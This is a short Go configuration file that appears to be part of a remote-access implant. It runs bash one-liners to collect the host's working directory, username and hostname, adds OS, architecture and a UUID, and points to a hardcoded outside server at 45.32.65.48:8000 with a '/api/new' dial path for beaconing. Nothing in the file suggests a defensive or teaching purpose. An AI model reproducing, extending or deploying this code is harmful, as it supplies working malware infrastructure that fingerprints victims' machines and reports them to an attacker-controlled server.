package config

import (
	"net/url"
	"os"
	"os/exec"
	"strings"
	"runtime"

	"github.com/google/uuid"
)

func run(oneliner string) []byte {
	cmd := exec.Command("/bin/bash", "-c", oneliner)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return []byte(err.Error())
	}
	return out
}

// TODO: use cross-platform golang package
var (
	pwd      = strings.TrimSpace(string(run(`pwd`)))
	whoami   = strings.TrimSpace(string(run(`whoami`)))
	hostname = strings.TrimSpace(string(run(`hostname`)))
	goos = runtime.GOOS
	goarch = runtime.GOARCH
)

type Config struct {
	Server       string
	Info         url.Values
	DialBasePath string
}

var Default *Config

func Init() {
	config := &Config{
		Info:         make(map[string][]string),
		Server:       "45.32.65.48:8000",
		DialBasePath: "/api/new",
	}

	if len(os.Args) > 1 {
		config.Server = os.Args[1]
	}

	config.Info.Set("id", uuid.New().String())
	config.Info.Set("pwd", pwd)
	config.Info.Set("whoami", whoami)
	config.Info.Set("hostname", hostname)
	config.Info.Set("os", goos)
	config.Info.Set("arch", goarch)

	Default = config
}
